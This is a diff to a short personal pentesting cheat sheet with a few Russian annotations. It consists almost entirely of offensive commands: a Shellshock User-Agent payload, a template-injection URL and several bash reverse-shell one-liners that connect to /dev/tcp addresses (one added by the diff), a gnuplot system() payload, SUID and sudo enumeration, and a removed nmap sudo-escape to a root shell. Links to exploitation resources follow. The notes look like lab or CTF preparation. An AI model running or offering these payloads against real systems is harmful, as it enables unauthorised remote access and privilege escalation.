@@ -34,23 +34,19 @@ curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&
 http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 0>&1"`'}
 
 bash -c "bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
-
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.50.123/4444 0>&1'
 echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\")" > file.plt
 
 Sudo -l
 find hacker -exec whoami \;
 find / -perm -u=s -type f 2>/dev/null
 
- TF=$(mktemp) 
- echo 'os.execute("/bin/bash")' > $TF
-sudo nmap --script=$TF 
+
 
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
 
 https://gtfobins.github.io/  повышение привелегий через судо-приложения
 
-
-https://github.com/rebootuser/LinEnum
 реверс
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell
 
